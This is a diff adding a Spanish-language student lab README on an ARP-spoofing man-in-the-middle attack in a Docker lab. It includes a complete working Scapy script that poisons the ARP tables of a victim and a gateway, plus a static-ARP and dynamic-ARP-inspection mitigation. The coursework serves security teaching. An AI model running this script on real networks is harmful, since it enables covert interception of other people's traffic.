@@ -1,0 +1,208 @@
+# Ataque MitM mediante ARP Spoofing y Mitigación
+**Nombre:** Emely Ventura  
+**Matrícula:** 20241140   
+**Fecha:** 01 de junio de 2026  
+Demostracion en YouTube: https://youtu.be/9R4yGcWdotI?si=CtuHv2VXR50UPDVa
+
+
+---
+
+##  Descripción
+
+Este repositorio contiene el script y la documentación técnica del ataque **Man in the Middle (MitM) mediante ARP Spoofing**, donde el atacante se posiciona en medio de la comunicación entre la víctima y el gateway, interceptando todo su tráfico de red sin ser detectado.
+
+---
+
+##  Objetivo del Laboratorio
+
+Demostrar de manera práctica el impacto de un ataque MitM en la Capa 2 del modelo OSI mediante la explotación del protocolo ARP, y validar una contra-medida técnica efectiva para mitigar este vector de ataque.
+
+---
+
+##  Topología de Red
+
+```
+[ Víctima: docker5 ]         [ Gateway: docker6 ]
+   10.24.11.2/24                10.24.11.1/24
+         |                            |
+         | eth1                  eth1 |
+         |                            |
+    eth1 |          eth2              |
+         +---[ Switch: docker7 ]------+
+                    | eth3
+                    |
+               eth1 |
+         [ Atacante: docker8 ]
+            10.24.11.40/24
+```
+
+| Dispositivo | Contenedor | Interfaz | IP | Rol |
+|---|---|---|---|---|
+| Víctima | docker5 | eth1 | 10.24.11.2/24 | Dispositivo objetivo |
+| Gateway | docker6 | eth1 | 10.24.11.1/24 | Router simulado |
+| Switch | docker7 | eth1/eth2/eth3 | N/A | Switch virtual (br0) |
+| Atacante | docker8 | eth1 | 10.24.11.40/24 | Origen del ataque |
+
+---
+
+##  Requisitos
+
+- Sistema Operativo: Linux (Docker/Kali Linux)
+- Python 3.x
+- Scapy 2.5.0
+- Permisos root
+- IP Forwarding habilitado
+
+### Instalación de Scapy (sin internet en el contenedor)
+
+```bash
+# Desde PNETLab, descargar y copiar al contenedor
+wget https://files.pythonhosted.org/packages/67/a1/2a60d5b6f0fed297dd0c0311c887d5e8a30ba1250506585b897e5a662f4c/scapy-2.5.0.tar.gz -P /tmp/
+docker cp /tmp/scapy-2.5.0.tar.gz docker8:/tmp/
+docker exec -it docker8 bash -c "cd /tmp && tar -xzf scapy-2.5.0.tar.gz && cd scapy-2.5.0 && python3 setup.py install"
+```
+
+---
+
+##  Uso
+
+```bash
+python3 arp_mitm.py   
+```
+
+### Ejemplo
+
+```bash
+python3 arp_mitm.py 10.24.11.2 10.24.11.1 eth1
+```
+
+---
+
+##  ¿Cómo funciona?
+
+1. El script obtiene la MAC real de la víctima y del gateway mediante ARP Request broadcast.
+2. Envía ARP Replies falsos a la víctima diciéndole que la MAC del gateway es la del atacante.
+3. Envía ARP Replies falsos al gateway diciéndole que la MAC de la víctima es la del atacante.
+4. Con IP Forwarding activo, el tráfico interceptado es reenviado al destino real — el ataque es invisible.
+5. Al detener con Ctrl+C, restaura automáticamente las tablas ARP de ambos dispositivos.
+
+---
+
+##  Contra-medida: ARP Estático
+
+```bash
+# Fijar la MAC legítima del gateway en la víctima
+arp -s 10.24.11.1 50:00:00:06:00:01
+
+# Verificar que quedó estática (flag M)
+arp -n
+```
+
+### Justificación técnica
+
+El comando `arp -s` crea una entrada ARP estática con flag **M (Manual)** que el sistema operativo no permite sobrescribir mediante paquetes ARP de la red. Cualquier ARP Reply falso enviado por el atacante es ignorado completamente.
+
+### Equivalente en Cisco IOS
+
+```
+Router(config)# arp 10.24.11.2 50:00:00:05:00:01 ARPA
+Switch(config)# ip arp inspection vlan 1
+Switch(config-if)# ip arp inspection trust
+```
+
+---
+
+##  Demostración en Video
+
+[Enlace al video en YouTube]
+
+---
+
+##  Documentación Técnica
+
+La documentación técnica profesional completa está disponible en este repositorio.
+
+arp_mitm.py
+Copia y pega esto como el archivo del script:
+python#!/usr/bin/env python3
+# ============================================================
+#  ARP MitM - Emely Ventura 20241140
+#  Materia: Seguridad de redes
+#  Maestro: Jonathan Esteban Rondon Corniel
+#  Fecha: 01 de junio de 2026
+# ============================================================
+
+from scapy.all import ARP, Ether, sendp, srp
+import time, sys, os
+
+def banner():
+    print("=" * 50)
+    print("  ARP MitM - Emely Ventura 20241140")
+    print("  Materia: Seguridad de redes")
+    print("=" * 50)
+
+def get_mac(ip, iface):
+    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    ans, _ = srp(arp_req, timeout=2, iface=iface, verbose=False)
+    for _, rcv in ans:
+        return rcv[Ether].src
+    return None
+
+def spoof(target_ip, spoof_ip, iface):
+    target_mac = get_mac(target_ip, iface)
+    if target_mac is None:
+        print(f"[!] No se pudo obtener MAC de {target_ip}")
+        return
+    pkt = Ether(dst=target_mac) / ARP(
+        op=2,
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=spoof_ip
+    )
+    sendp(pkt, iface=iface, verbose=False)
+
+def restore(target_ip, gateway_ip, iface):
+    target_mac  = get_mac(target_ip,  iface)
+    gateway_mac = get_mac(gateway_ip, iface)
+    if target_mac and gateway_mac:
+        pkt1 = Ether(dst=target_mac) / ARP(
+            op=2, pdst=target_ip, hwdst=target_mac,
+            psrc=gateway_ip, hwsrc=gateway_mac)
+        pkt2 = Ether(dst=gateway_mac) / ARP(
+            op=2, pdst=gateway_ip, hwdst=gateway_mac,
+            psrc=target_ip, hwsrc=target_mac)
+        sendp(pkt1, iface=iface, verbose=False, count=5)
+        sendp(pkt2, iface=iface, verbose=False, count=5)
+        print("[*] Tablas ARP restauradas.")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Uso: python3 arp_mitm.py <IP_VICTIMA> <IP_GATEWAY> <INTERFAZ>")
+        print("Ejemplo: python3 arp_mitm.py 10.24.11.2 10.24.11.1 eth1")
+        sys.exit(1)
+
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    TARGET_IP  = sys.argv[1]
+    GATEWAY_IP = sys.argv[2]
+    IFACE      = sys.argv[3]
+
+    banner()
+    print(f"[*] Objetivo : {TARGET_IP}")
+    print(f"[*] Gateway  : {GATEWAY_IP}")
+    print(f"[*] Interfaz : {IFACE}")
+    print("[*] Iniciando... Ctrl+C para detener\n")
+
+    paquetes = 0
+    try:
+        while True:
+            spoof(TARGET_IP,  GATEWAY_IP, IFACE)
+            spoof(GATEWAY_IP, TARGET_IP,  IFACE)
+            paquetes += 2
+            print(f"\r[*] Paquetes enviados: {paquetes}", end="")
+            time.sleep(0.01)
+    except KeyboardInterrupt:
+        print(f"\n[!] Ataque detenido. Total: {paquetes} paquetes.")
+        print("[*] Restaurando tablas ARP...")
+        restore(TARGET_IP, GATEWAY_IP, IFACE)
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
